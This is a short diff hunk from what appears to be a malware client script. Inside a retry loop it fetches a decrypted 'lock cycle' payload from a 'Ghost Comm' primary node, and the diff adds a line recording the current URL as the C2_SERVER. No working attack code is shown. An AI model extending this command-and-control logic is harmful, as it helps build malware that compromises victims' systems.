@@ -745,6 +745,7 @@ if __name__ == '__main__':
                     client.connect_to_primary_node()
                     decrypted_payload = client.request_lock_cycle_payload()
                     ghost_comm_client = client
+                    C2_SERVER = current_url
                     logger.info("Successfully retrieved payload from Ghost Comm.")
                     break
                 except Exception as exc:
